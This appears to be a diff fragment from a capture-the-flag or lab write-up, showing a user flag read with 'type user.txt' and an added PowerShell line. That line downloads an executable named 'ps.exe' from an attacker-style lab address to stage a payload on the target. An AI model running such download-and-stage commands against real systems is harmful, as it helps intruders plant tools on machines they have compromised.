@@ -77,4 +77,4 @@ type user.txt
 02650d3a69a70780c302e146a6cb96f3
 
 
-
+(new-object System.Net.WebClient).Downloadfile(‘http://10.10.14.50:80/ps.exe', ‘ps.exe’)
